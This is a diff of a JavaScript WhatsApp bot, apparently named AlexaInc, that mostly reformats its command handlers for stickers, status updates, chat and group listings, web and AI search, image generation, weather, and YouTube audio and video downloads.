+                const buffer = await getEmojicook(emoji1, emoji2);
+
+                // convert image → sticker webp
+                const stickerBuffer = await sharp(buffer)
+                  .resize(512, 512, {
+                    fit: "contain",
+                    background: { r: 0, g: 0, b: 0, alpha: 0 },
+                    kernel: sharp.kernel.lanczos3,
+                  })
+                  .webp({
+                    quality: 100,
+                    lossless: true,
+                  })
+                  .toBuffer();
+
+                // send sticker
+                await AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  { sticker: stickerBuffer },
+                  { quoted: msg },
+                );
+
+                await AlexaInc.sendMessage(msg.key.remoteJid, {
+                  react: { text: "✅", key: msg.key },
+                });
+              } catch (error) {
+                console.error("EmojiMix Error:", error.message);
+
+                await AlexaInc.sendMessage(msg.key.remoteJid, {
+                  react: { text: "❌", key: msg.key },
+                });
+
+                if (error.message?.includes("not found")) {
+                  await AlexaInc.sendMessage(
+                    msg.key.remoteJid,
+                    { text: "Sorry, I can't mix those two emojis 😢" },
+                    { quoted: msg },
+                  );
+                } else {
+                  await AlexaInc.sendMessage(
+                    msg.key.remoteJid,
+                    { text: "An error occurred while creating the sticker." },
+                    { quoted: msg },
+                  );
+                }
+              }
+
+              break;
+            }
+
+            case "cabout": {
+              if (!isOwner) return mess.owner();
+              if (!text)
+                return await AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: "please send a text for set about baby",
+                });
+
+              try {
+                const response = await AlexaInc.updateProfileStatus(text);
+                console.log(response);
+
+                await AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: "profile status updated baby",
+                });
+              } catch (err) {
+                console.error("Error updating profile status:", err);
+
+                await AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: "Failed to update profile status baby 😢",
+                });
+              }
+
+              break;
+            }
+
+            case "listpc": {
+              const prvatechatss = loadAllPrivateChats();
+              console.log(prvatechatss);
+
+              if (prvatechatss.length === 0) {
+                await AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  {
+                    text: "⚠️ No private chat users found in database.",
+                  },
+                  {
+                    quoted: msg,
+                  },
+                );
+                return;
+              }
+
+              // 1. Extract all JIDs for the 'mentions' parameter
+              const mentionIds = prvatechatss.map((u) => u.jid);
+
+              // 2. Create the visible text (e.g. "@947123... (Name)")
+              // We use u.number for the visual tag
+              const txt = prvatechatss
+                .map(
+                  (u, i) => `${i + 1}. @${u.number} (${u.name || "Unknown"})`,
+                )
+                .join("\n");
+
+              // 3. Send message with 'mentions' array
+              await AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                {
+                  text: `*📂 Private Chat Users List:*\n\n${txt}`,
+                  mentions: mentionIds, // <--- REQUIRED to turn the text blue/clickable
+                },
+                {
+                  quoted: msg,
+                },
+              );
+
+              break;
+            }
+
+            case "listgc": {
+              // 1. Load all groups from your database function
+              const groups = loadAllGroups();
+
+              if (groups.length === 0) {
+                await AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  {
+                    text: "⚠️ No groups found in database.",
+                  },
+                  {
+                    quoted: msg,
+                  },
+                );
+                break;
+              }
+
+              // 2. Create the list text
+              // We display the Name and the ID (cleaned up)
+              const txt = groups
+                .map(
+                  (g, i) =>
+                    `*${i + 1}. ${g.name || "Unknown Name"}*\nID: ${g.id.split("@")[0]}`,
+                )
+                .join("\n\n");
+
+              // 3. Send the message
+              // Note: We don't need a 'mentions' array here because you can't tag a Group ID.
+              await AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                {
+                  text: `*🏢 Group Chats List:*\n\n${txt}`,
+                },
+                {
+                  quoted: msg,
+                },
+              );
+
+              break;
+            }
+
+            case "search":
+            case "browse":
+            case "web": {
+              try {
+                console.log("Starting search..."); // You control logging here
+
+                const results = await websearch_query(text);
+                let replymsg = "";
+                for (let index = 0; index < results.length; index++) {
+                  const para = results[index].paragraph;
+                  const url = results[index].url;
+                  replymsg =
+                    replymsg +
+                    `\n
 result - ${para}
 source - ${url}
-      `
+      `;
+                }
+                AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  {
+                    text: replymsg,
+                  },
+                  {
+                    quoted: msg,
+                  },
+                );
+                // console.log(replymsg)
+              } catch (error) {
+                // This will catch API key errors or Google API failures
+                console.error("A critical error occurred:", error); // Log full error object
+                AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  {
+                    text: `A critical error occurred: ${error.message}\n\nStack: ${error.stack ? error.stack.split("\n").slice(0, 3).join("\n") : "No stack"}`,
+                  },
+                  {
+                    quoted: msg,
+                  },
+                );
+              }
 
-                                }
-                                AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: replymsg,
-                                }, {
-                                    quoted: msg
-                                })
-                                // console.log(replymsg)
-                            } catch (error) {
-                                // This will catch API key errors or Google API failures
-                                console.error("A critical error occurred:", error); // Log full error object
-                                AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: `A critical error occurred: ${error.message}\n\nStack: ${error.stack ? error.stack.split('\n').slice(0, 3).join('\n') : 'No stack'}`,
-                                }, {
-                                    quoted: msg
-                                })
-                            }
+              break;
+            }
 
+            case "webai":
+            case "aiweb": {
+              if (!text) return mess.reply("provide text to search");
+              try {
+                result = await ai.searchWeb(text);
+                const providerList =
+                  result?.providers?.map((p) => `• ${p}`).join("\n") || "";
+                replymsg = result?.text + `\n\n*Providers:*\n` + providerList;
 
-                            break
-                        }
+                AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  {
+                    text: replymsg,
+                  },
+                  {
+                    quoted: msg,
+                  },
+                );
+              } catch (e) {
+                console.error(e);
+              }
+              break;
+            }
 
-                        case 'webai':
-                        case 'aiweb':{
-                            if (!text) return  mess.reply('provide text to search')
-                            try {
-                                result = await ai.searchWeb(text);
-                                const providerList = result?.providers?.map(p => `• ${p}`).join('\n') || '';
-                                replymsg = (result?.text+`\n\n*Providers:*\n`+ providerList);
+            //                        case'nsfw':{
+            //                            // not  done yet
+            // try {
+            //     const result =await ai.detectNsfw();
+            //     console.log(result);
+            // }catch (e) {
+            //     console.error(e);
+            // }
+            //                            break;
+            //                        }
+            case "imagine": {
+              if (!text)
+                return mess.reply(
+                  "Please provide a prompt to generate an image.",
+                );
 
-                                AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: replymsg,
-                                }, {
-                                    quoted: msg
-                                })
-                            }catch (e) {
-                                console.error(e);
-                            }
-                            break;
-                        }
+              try {
+                await AlexaInc.sendPresenceUpdate(
+                  "composing",
+                  msg.key.remoteJid,
+                );
 
- //                        case'nsfw':{
- //                            // not  done yet
- // try {
- //     const result =await ai.detectNsfw();
- //     console.log(result);
- // }catch (e) {
- //     console.error(e);
- // }
- //                            break;
- //                        }
-                        case 'imagine': {
-                            if (!text) return mess.reply('Please provide a prompt to generate an image.');
+                const result = await ai.generateImage(text);
 
-                            try {
-                                await AlexaInc.sendPresenceUpdate('composing', msg.key.remoteJid);
+                if (!result || !result.url) {
+                  return AlexaInc.sendMessage(
+                    msg.key.remoteJid,
+                    {
+                      text: "⚠️ Image generation failed. The API service is currently unavailable.",
+                    },
+                    { quoted: msg },
+                  );
+                }
 
-                                const result = await ai.generateImage(text);
+                const imgbuf = await getBuffer(result.url);
 
-                                if (!result || !result.url) {
-                                    return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                        text: '⚠️ Image generation failed. The API service is currently unavailable.'
-                                    }, { quoted: msg });
-                                }
+                if (!imgbuf || !Buffer.isBuffer(imgbuf)) {
+                  return AlexaInc.sendMessage(
+                    msg.key.remoteJid,
+                    {
+                      text: "⚠️ Failed to download the generated image.",
+                    },
+                    { quoted: msg },
+                  );
+                }
 
-                                const imgbuf = await getBuffer(result.url);
+                await AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  { image: imgbuf, caption: `Prompt: ${text}` },
+                  { quoted: msg },
+                );
+              } catch (e) {
+                console.error("[Imagine Error]:", e);
+                await AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  {
+                    text: `❌ Error generating image: ${e.message || "Unknown error"}`,
+                  },
+                  { quoted: msg },
+                );
+              }
+              break;
+            }
+            case "summerize": {
+              if (!text) return mess.reply("provide text to generate");
+              try {
+                const result = await ai.summarizeText(text);
+                console.log(result);
+              } catch (e) {
+                AlexaInc.sendMessage(msg.key.remoteJid, { text: e.message });
+              }
+              break;
+            }
+            case "weather": {
+              if (!text) {
+                AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  {
+                    text: "Please enter city after command",
+                  },
+                  {
+                    quoted: msg,
+                  },
+                );
+              }
 
-                                if (!imgbuf || !Buffer.isBuffer(imgbuf)) {
-                                    return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                        text: '⚠️ Failed to download the generated image.'
-                                    }, { quoted: msg });
-                                }
-
-                                await AlexaInc.sendMessage(
-                                    msg.key.remoteJid,
-                                    { image: imgbuf, caption: `Prompt: ${text}` },
-                                    { quoted: msg }
-                                );
-
-                            } catch (e) {
-                                console.error('[Imagine Error]:', e);
-                                await AlexaInc.sendMessage(
-                                    msg.key.remoteJid,
-                                    { text: `❌ Error generating image: ${e.message || 'Unknown error'}` },
-                                    { quoted: msg }
-                                );
-                            }
-                            break;
-                        }
-                        case'summerize':{
-                            if (!text) return  mess.reply('provide text to generate')
-                            try {
-                                const result = await ai.summarizeText(text);
-                                console.log(result);
-                            }catch (e) {
-                                AlexaInc.sendMessage(msg.key.remoteJid, {text:e.message})
-                            }
-                                break;
-                            }
-                        case 'weather': {
-                            if (!text) {
-                                AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: 'Please enter city after command'
-                                }, {
-                                    quoted: msg
-                                });
-                            }
-
-
-                            try {
-
-                                const weatherjson = await weatherof(text)
-                                const repmasga = `
+              try {
+                const weatherjson = await weatherof(text);
+                const repmasga = `
 *City*        *-* *${weatherjson.city}/${weatherjson.country}*
-*Time*        *-* *${moment.tz('Asia/Colombo').format('HH:mm')}* *UTC* *+5.30*
+*Time*        *-* *${moment.tz("Asia/Colombo").format("HH:mm")}* *UTC* *+5.30*
 *Tempurature* *-* *${weatherjson.temperature}*
 *Wind-speed*  *-* *${weatherjson.wind_speed}*
 *Description* *-* *${weatherjson.description}*
-      `
-                                AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    image: {
-                                        url: './assets/img/unnamed.jpeg'
-                                    },
-                                    caption: repmasga
-                                }, {
-                                    quoted: msg
-                                });
-                            } catch (error) {
-                                console.log(error)
-                                AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    react: {
-                                        text: '☹️',
-                                        key: msg.key
-                                    }
-                                });
-                                AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: error.message || error
-                                }, {
-                                    quoted: msg
-                                });
-                            }
+      `;
+                AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  {
+                    image: {
+                      url: "./assets/img/unnamed.jpeg",
+                    },
+                    caption: repmasga,
+                  },
+                  {
+                    quoted: msg,
+                  },
+                );
+              } catch (error) {
+                console.log(error);
+                AlexaInc.sendMessage(msg.key.remoteJid, {
+                  react: {
+                    text: "☹️",
+                    key: msg.key,
+                  },
+                });
+                AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  {
+                    text: error.message || error,
+                  },
+                  {
+                    quoted: msg,
+                  },
+                );
+              }
 
+              break;
+            }
 
+            case "setqst": {
+              if (roleuser === "Owner") {
+                saveQuestionsData(text);
+              }
+              break;
+            }
 
-                            break;
-                        }
+            case "yts": {
+              if (!text) {
+                AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: "please send with what you want to search",
+                });
+                AlexaInc.sendMessage(msg.key.remoteJid, {
+                  react: {
+                    text: "☹️",
+                    key: msg.key,
+                  },
+                });
+              } else {
+                searchYouTubeMusic(text);
+              }
+              async function searchYouTubeMusic(query) {
+                try {
+                  const results = await yts(query); // Search YouTube for the query
+                  const videos = results.videos;
 
-                        case 'setqst': {
+                  //AlexaInc.sendMessage(msg.key.remoteJid, {text:`Found ${videos.length} results for "${query}" Here is some results:\n`},{quoted:msg})
+                  //AlexaInc.sendMessage(msg.key.remoteJid,{text:videoresult},{quoted:msg})
 
-                            if (roleuser === 'Owner') {
-                                saveQuestionsData(text);
-                            }
-                            break
-                        }
+                  const preparemsttt = " ";
+                  //console.log(`Found ${videos.length} results for "${query}":\n`);
+                  AlexaInc.sendMessage(msg.key.remoteJid, {
+                    react: {
+                      text: "✅",
+                      key: msg.key,
+                    },
+                  });
+                  // Display the top 5 results
+                  const interactiveButtons = [
+                    {
+                      name: "single_select",
+                      buttonParamsJson: JSON.stringify({
+                        title: "Select a video to download",
+                        sections: [
+                          {
+                            title: "Top 4 Videos",
+                            highlight_label: "Select",
+                            rows: videos.slice(0, 4).map((video, index) => ({
+                              header: video.title,
+                              title: `${index + 1}`,
+                              description: "",
+                              id: `.ytdl_select ${video.url}`,
+                            })),
+                          },
+                        ],
+                      }),
+                    },
+                  ];
 
-                        case 'yts': {
-                            if (!text) {
-                                AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: 'please send with what you want to search'
-                                })
-                                AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    react: {
-                                        text: '☹️',
-                                        key: msg.key
-                                    }
-                                });
-                            } else {
-                                searchYouTubeMusic(text);
-                            }
-                            async function searchYouTubeMusic(query) {
-                                try {
-                                    const results = await yts(query); // Search YouTube for the query
-                                    const videos = results.videos;
+                  const interactiveMessage = {
+                    text: `Found ${videos.length}  results for ${query} Choose a video to download as audio:`,
+                    title: `Hello ${msg.pushName}`,
+                    footer: "Powered by HANSAKA",
+                    interactiveButtons,
+                  };
 
-                                    //AlexaInc.sendMessage(msg.key.remoteJid, {text:`Found ${videos.length} results for "${query}" Here is some results:\n`},{quoted:msg})
-                                    //AlexaInc.sendMessage(msg.key.remoteJid,{text:videoresult},{quoted:msg})
+                  await AlexaInc.sendMessage(
+                    msg.key.remoteJid,
+                    interactiveMessage,
+                    {
+                      quoted: msg,
+                    },
+                  );
 
-                                    let preparemsttt = " ";
-                                    //console.log(`Found ${videos.length} results for "${query}":\n`);
-                                    AlexaInc.sendMessage(msg.key.remoteJid, {
-                                        react: {
-                                            text: '✅',
-                                            key: msg.key
-                                        }
-                                    })
-                                    // Display the top 5 results
-                                    const interactiveButtons = [{
-                                        name: "single_select",
-                                        buttonParamsJson: JSON.stringify({
-                                            title: "Select a video to download",
-                                            sections: [{
-                                                title: "Top 4 Videos",
-                                                highlight_label: "Select",
-                                                rows: videos.slice(0, 4).map((video,
-                                                    index) => ({
-                                                        header: video.title,
-                                                        title: `${index + 1}`,
-                                                        description: "",
-                                                        id: `.ytdl_select ${video.url}`
-                                                    }))
-                                            }]
-                                        })
-                                    }];
+                  //     videos.slice(0, 4).forEach((video,index) => {
+                  // const line = '_'.repeat(54)
+                  // const videoresult = `${index+1}. Title: ${video.title}
+                  //    URL: ${video.url}
+                  //    Duration: ${video.timestamp}
+                  // ${line}\n\n
 
-                                    const interactiveMessage = {
-                                        text: `Found ${videos.length}  results for ${query} Choose a video to download as audio:`,
-                                        title: `Hello ${msg.pushName}`,
-                                        footer: "Powered by HANSAKA",
-                                        interactiveButtons
-                                    };
+                  // `
+                  // preparemsttt += videoresult
 
+                  //     });
 
-                                    await AlexaInc.sendMessage(msg.key.remoteJid, interactiveMessage, {
-                                        quoted: msg
-                                    })
+                  //     AlexaInc.sendMessage(msg.key.remoteJid,{text:`${preparemsttt}\n
+                  //     if you seach about song\nyou can download it
+                  // .ytdl link/of/song
+                  // command like this
+                  // you can coppy link from above
+                  // Hansaka@AlexxaInc © All Right Reserved`},{quoted:msg})
+                } catch (error) {
+                  return ("Error searching YouTube :", error);
+                }
+              }
 
-                                    //     videos.slice(0, 4).forEach((video,index) => {
-                                    // const line = '_'.repeat(54)
-                                    // const videoresult = `${index+1}. Title: ${video.title}
-                                    //    URL: ${video.url}
-                                    //    Duration: ${video.timestamp}
-                                    // ${line}\n\n
+              break;
+            }
 
+            ////this is button handler of yts
+            case "ytdl_select": {
+              await AlexaInc.sendMessage(msg.key.remoteJid, {
+                delete: msg.key,
+              });
+              try {
+                // 1. Call the function from your module
+                const info = await yth2.getInfo(text);
 
-                                    // `
-                                    // preparemsttt += videoresult
+                // 2. Assign to your specific variable structure
+                const details = {
+                  name: info.title,
+                  uploader: info.author, // Module returns 'author', you map it to 'uploader'
+                  durationInSeconds: info.duration, // Note: API usually returns a string like "3:32"
+                  thumbnailUrl: info.thumbnail,
+                };
 
+                // --- NEW LOGIC STARTS HERE ---
 
-                                    //     });
+                // Define the duration threshold (8 minutes * 60 seconds)
+                const maxVideoDuration = 480;
 
-                                    //     AlexaInc.sendMessage(msg.key.remoteJid,{text:`${preparemsttt}\n
-                                    //     if you seach about song\nyou can download it
-                                    // .ytdl link/of/song
-                                    // command like this 
-                                    // you can coppy link from above
-                                    // Hansaka@AlexxaInc © All Right Reserved`},{quoted:msg})
-                                } catch (error) {
-                                    return ('Error searching YouTube :', error);
-                                }
-                            }
+                // Define all possible button rows
+                const row360p = {
+                  header: " ",
+                  title: "360p Video",
+                  id: `.dl360p ${text}`,
+                };
+                const row480p = {
+                  header: " ",
+                  title: "720p Video",
+                  id: `.dl480p ${text}`,
+                };
+                const rowMp3 = {
+                  header: " ",
+                  title: "Audio mp3",
+                  id: `.dlmp3 ${text}`,
+                };
+                const rowvoice = {
+                  header: " ",
+                  title: "Voice massage",
+                  id: `.dlvoice ${text}`,
+                };
 
-                            break
-                        }
+                const buttonRows = []; // This will be our dynamic list of rows
 
-                        ////this is button handler of yts
-                        case "ytdl_select": {
-                            await AlexaInc.sendMessage(msg.key.remoteJid, {
-                                delete: msg.key
-                            })
-                            try {
-                                // 1. Call the function from your module
-                                const info = await yth2.getInfo(text);
+                if (details.durationInSeconds > maxVideoDuration && !isOwner) {
+                  // Video is longer than 8 minutes, only add MP3
+                  buttonRows.push(rowMp3);
+                  // buttonRows.push(rowvoice);
+                } else {
+                  // Video is 8 minutes or less, add all options
+                  // buttonRows.push(row360p);
+                  buttonRows.push(row480p);
+                  buttonRows.push(rowMp3);
+                  // buttonRows.push(rowvoice);
+                }
 
-                                // 2. Assign to your specific variable structure
-                                const details = {
-                                    name: info.title,
-                                    uploader: info.author, // Module returns 'author', you map it to 'uploader'
-                                    durationInSeconds: info
-                                        .duration, // Note: API usually returns a string like "3:32"
-                                    thumbnailUrl: info.thumbnail
-                                };
+                // --- NEW LOGIC ENDS HERE ---
 
-                                // --- NEW LOGIC STARTS HERE ---
+                const interactiveButtons = [
+                  {
+                    name: "single_select",
+                    buttonParamsJson: JSON.stringify({
+                      title: "Check avalable qualities",
+                      sections: [
+                        {
+                          title: "select a format",
+                          // Use the dynamically created buttonRows array
+                          rows: buttonRows,
+                        },
+                      ],
+                    }),
+                  },
+                ];
 
-                                // Define the duration threshold (8 minutes * 60 seconds)
-                                const maxVideoDuration = 480;
-
-                                // Define all possible button rows
-                                const row360p = {
-                                    header: ' ',
-                                    title: '360p Video',
-                                    id: `.dl360p ${text}`
-                                };
-                                const row480p = {
-                                    header: ' ',
-                                    title: '720p Video',
-                                    id: `.dl480p ${text}`
-                                };
-                                const rowMp3 = {
-                                    header: ' ',
-                                    title: 'Audio mp3',
-                                    id: `.dlmp3 ${text}`
-                                };
-                                const rowvoice = {
-                                    header: ' ',
-                                    title: 'Voice massage',
-                                    id: `.dlvoice ${text}`
-                                };
-
-                                let buttonRows = []; // This will be our dynamic list of rows
-
-                                if (details.durationInSeconds > maxVideoDuration && !isOwner) {
-                                    // Video is longer than 8 minutes, only add MP3
-                                    buttonRows.push(rowMp3);
-                                    // buttonRows.push(rowvoice);
-                                } else {
-                                    // Video is 8 minutes or less, add all options
-                                    // buttonRows.push(row360p);
-                                    buttonRows.push(row480p);
-                                    buttonRows.push(rowMp3);
-                                    // buttonRows.push(rowvoice);
-                                }
-
-                                // --- NEW LOGIC ENDS HERE ---
-
-                                const interactiveButtons = [{
-                                    name: "single_select",
-                                    buttonParamsJson: JSON.stringify({
-                                        title: "Check avalable qualities",
-                                        sections: [{
-                                            title: "select a format",
-                                            // Use the dynamically created buttonRows array
-                                            rows: buttonRows
-                                        }]
-                                    })
-                                }];
-
-                                const vidinfo = `
+                const vidinfo = `
 Name : ${details.name}
 Uploader : ${details.uploader}
 Duration : ${formatTime(details.durationInSeconds)}
 `;
 
-                                const interactiveMessage = {
-                                    image: {
-                                        url: details.thumbnailUrl
-                                    },
-                                    caption: vidinfo,
-                                    footer: "Powered by HANSAKA",
-                                    interactiveButtons
-                                };
+                const interactiveMessage = {
+                  image: {
+                    url: details.thumbnailUrl,
+                  },
+                  caption: vidinfo,
+                  footer: "Powered by HANSAKA",
+                  interactiveButtons,
+                };
 
-                                await AlexaInc.sendMessage(msg.key.remoteJid, interactiveMessage, {
-                                    quoted: msg
-                                });
+                await AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  interactiveMessage,
+                  {
+                    quoted: msg,
+                  },
+                );
+              } catch (error) {
+                console.error(
+                  "Failed to get video info:",
+                  error.stderr || error.message,
+                );
+              }
+              break;
+            }
 
-                            } catch (error) {
-                                console.error('Failed to get video info:', error.stderr || error.message);
-                            }
-                            break;
-                        }
+            /*case 'dl360p':*/
+            case "dl480p":
+            case "dlmp3":
+            case "dlvoice": {
+              await AlexaInc.sendMessage(msg.key.remoteJid, {
+                delete: msg.key,
+              });
+              const smkey = (
+                await AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  {
+                    text: "⏳ wait your (Video/Audio) processing",
+                  },
+                  {
+                    quoted: msg,
+                  },
+                )
+              ).key;
 
-                        /*case 'dl360p':*/
-                        case 'dl480p':
-                        case 'dlmp3':
-                        case 'dlvoice': {
-                            await AlexaInc.sendMessage(msg.key.remoteJid, {
-                                delete: msg.key
-                            })
-                            const smkey = (await AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: '⏳ wait your (Video/Audio) processing'
-                            }, {
-                                quoted: msg
-                            })).key
+              // Inside your main message handler function...
+              // Make sure fsp is imported at the top of your file
+              // const fsp = require('fs').promises;
 
+              let filePath = null; // <-- DECLARE THE VARIABLE HERE (outside try)
 
-                            // Inside your main message handler function...
-                            // Make sure fsp is imported at the top of your file
-                            // const fsp = require('fs').promises;
+              try {
+                // DO NOT declare filePath here
 
-                            let filePath = null; // <-- DECLARE THE VARIABLE HERE (outside try)
+                const qulitimap = {
+                  dl360p: "360",
+                  dl480p: "480",
+                  dlmp3: "mp3",
+                  dlvoice: "ogg",
+                };
 
-                            try {
-                                // DO NOT declare filePath here
+                const dlquality = qulitimap[command];
 
-                                const qulitimap = {
-                                    'dl360p': '360',
-                                    'dl480p': '480',
-                                    'dlmp3': 'mp3',
-                                    'dlvoice': 'ogg'
-                                };
+                if (dlquality === "ogg") {
+                  // 1. Download file and get the path
+                  filePath = await yth2.yta(text); // Assign to the outer variable
+                  // const devsound = await yth2.fetchBuffer(filePath.download)
+                  // 2. Send the file FROM THE PATH
 
-                                const dlquality = qulitimap[command];
+                  await AlexaInc.sendMessage(
+                    msg.key.remoteJid,
+                    {
+                      audio: filePath,
+                      mimetype: "audio/mpeg",
+                      ptt: true,
+                    },
+                    {
+                      quoted: msg,
+                    },
+                  );
+                } else if (dlquality === "mp3") {
+                  filePath = await yth2.yta(text); // Assign to the outer variable
+                  // const devsound = await yth2.fetchBuffer(filePath.download)
+                  // 2. Send the file FROM THE PATH
+                  await AlexaInc.sendMessage(
+                    msg.key.remoteJid,
+                    {
+                      audio: filePath,
+                      mimetype: "audio/mp4",
+                    },
+                    {
+                      quoted: msg,
+                    },
+                  );
+                } else {
+                  // 1. Find the video format
+                  // const formatId = await findVideoFormat(text, dlquality);
+                  // if (!formatId) {
+                  //   throw new Error(`Could not find a ${dlquality}p MP4 format with audio.`);
+                  // }
 
-                                if (dlquality === 'ogg') {
-                                    // 1. Download file and get the path
-                                    filePath = await yth2.yta(text); // Assign to the outer variable
-                                    // const devsound = await yth2.fetchBuffer(filePath.download)
-                                    // 2. Send the file FROM THE PATH
+                  // 2. Download file and get the path
+                  const fileurl = await yth2.ytv(text); // Assign to the outer variable
+                  // const filebuf = await yth2.fetchBuffer(fileurl.download)
 
-                                    await AlexaInc.sendMessage(msg.key.remoteJid, {
-                                        audio: filePath,
-                                        mimetype: 'audio/mpeg',
-                                        ptt: true
-                                    }, {
-                                        quoted: msg
-                                    });
+                  // 3. Send the file FROM THE PATH
+                  await AlexaInc.sendMessage(
+                    msg.key.remoteJid,
+                    {
+                      document: fileurl,
+                      fileName: `${text}.mp4`,
+                      caption: `here is your video ${text}`,
+                      footer: "Powerd by AlexaInc",
+                      mimeType: "video/mp4",
+                    },
+                    {
+                      quoted: msg,
+                    },
+                  );
+                }
 
+                AlexaInc.sendMessage(msg.key.remoteJid, {
+                  text: "download and sended compleated ✅",
+                  edit: smkey,
+                });
+              } catch (error) {
+                console.log(error);
+                AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  {
+                    text: `Error: ${error.message}`,
+                  },
+                  {
+                    quoted: msg,
+                  },
+                );
+              } finally {
+                // 4. DELETE THE FILE
+                // This can now see the 'filePath' variable
+                // if (filePath) {
+                //   try {
+                //     await fsp.unlink(filePath); // Delete the file
+                //     console.log('Successfully deleted temp file:', filePath);
+                //   } catch (deleteError) {
+                //     console.error('Failed to delete temp file:', deleteError);
+                //   }
+                // }
+              }
 
-                                } else if (dlquality === 'mp3') {
-                                    filePath = await yth2.yta(text); // Assign to the outer variable
-                                    // const devsound = await yth2.fetchBuffer(filePath.download)
-                                    // 2. Send the file FROM THE PATH
-                                    await AlexaInc.sendMessage(msg.key.remoteJid, {
-                                        audio: filePath,
-                                        mimetype: 'audio/mp4'
-                                    }, {
-                                        quoted: msg
-                                    });
+              break;
+            }
 
+            case "song": {
+              // generateBox('ihahfaafafifasfaik', 50)
+              if (!text)
+                return AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  {
+                    text: "name not provided here is ex:- .song song name",
+                  },
+                  {
+                    quoted: msg,
+                  },
+                );
 
-                                } else {
-                                    // 1. Find the video format
-                                    // const formatId = await findVideoFormat(text, dlquality);
-                                    // if (!formatId) {
-                                    //   throw new Error(`Could not find a ${dlquality}p MP4 format with audio.`);
-                                    // }
+              const dummymg = await AlexaInc.sendMessage(
+                msg.key.remoteJid,
+                {
+                  text: "wait song is downloading",
+                },
+                {
+                  quoted: msg,
+                },
+              );
+              try {
+                const results = await yts(text);
+                const video = results.videos[0];
+                // console.log(video.author)
+                const filePath = await yth2.yta(video.url); // Assign to the outer variable
+                // const devsound = await yth2.fetchBuffer(filePath.download)
+                const sonst4 = await fonts.convert(video.title, "font1");
+                const cons5 = video.duration.timestamp;
+                const con4 = await fonts.convert(video.author.name, "font1");
 
-                                    // 2. Download file and get the path
-                                    const fileurl = await yth2.ytv(text); // Assign to the outer variable
-                                    // const filebuf = await yth2.fetchBuffer(fileurl.download)
-
-                                    // 3. Send the file FROM THE PATH
-                                    await AlexaInc.sendMessage(msg.key.remoteJid, {
-
-                                        document: fileurl,
-                                        fileName: `${text}.mp4`,
-                                        caption: `here is your video ${text}`,
-                                        footer: 'Powerd by AlexaInc',
-                                        mimeType: 'video/mp4'
-                                    }, {
-                                        quoted: msg
-                                    });
-                                }
-
-                                AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: 'download and sended compleated ✅',
-                                    edit: smkey
-                                })
-                            } catch (error) {
-                                console.log(error);
-                                AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    text: `Error: ${error.message}`
-                                }, {
-                                    quoted: msg
-                                });
-                            } finally {
-                                // 4. DELETE THE FILE
-                                // This can now see the 'filePath' variable
-                                // if (filePath) { 
-                                //   try {
-                                //     await fsp.unlink(filePath); // Delete the file
-                                //     console.log('Successfully deleted temp file:', filePath);
-                                //   } catch (deleteError) {
-                                //     console.error('Failed to delete temp file:', deleteError);
-                                //   }
-                                // }
-                            }
-
-
-
-
-                            break;
-                        }
-
-                        case 'song': {
-                            // generateBox('ihahfaafafifasfaik', 50)
-                            if (!text) return AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: 'name not provided here is ex:- .song song name'
-                            }, {
-                                quoted: msg
-                            })
-
-                            const dummymg = await AlexaInc.sendMessage(msg.key.remoteJid, {
-                                text: 'wait song is downloading'
-                            }, {
-                                quoted: msg
-                            });
-                            try {
-                                const results = await yts(text);
-                                const video = results.videos[0];
-                                // console.log(video.author)
-                                const filePath = await yth2.yta(video.url); // Assign to the outer variable
-                                // const devsound = await yth2.fetchBuffer(filePath.download)
-                                const sonst4 = await fonts.convert(video.title, 'font1')
-                                const cons5 = video.duration.timestamp;
-                                const con4 = await fonts.convert(video.author.name, 'font1')
-
-                                const textl = `
+                const textl = `
 ɴᴀᴍᴇ : ${sonst4}
 ᴅᴜʀᴀᴛɪᴏɴ : ${cons5}
 ᴀᴜᴛʜᴏʀ : ${con4}
 `;
 
-                                const cap = generateBox(textl, 21);
-                                // console.log(cap)
-                                await AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    document: filePath,
-                                    fileName: `${text}.mp3`,
-                                    mimetype: 'audio/mp3',
-                                    caption: cap,
-                                    footer: 'Powerd by AlexaInc',
-                                }, {
-                                    quoted: msg
-                                });
+                const cap = generateBox(textl, 21);
+                // console.log(cap)
+                await AlexaInc.sendMessage(
+                  msg.key.remoteJid,
+                  {
+                    document: filePath,
+                    fileName: `${text}.mp3`,
+                    mimetype: "audio/mp3",
+                    caption: cap,
+                    footer: "Powerd by AlexaInc",
+                  },
+                  {
+                    quoted: msg,
+                  },
+                );
 
-                                await AlexaInc.sendMessage(msg.key.remoteJid, {
-                                    delete: dummymg.key
-                                })
+                await AlexaInc.sendMessage(msg.key.remoteJid, {
+                  delete: dummymg.key,
+                });
+              } catch (error) {
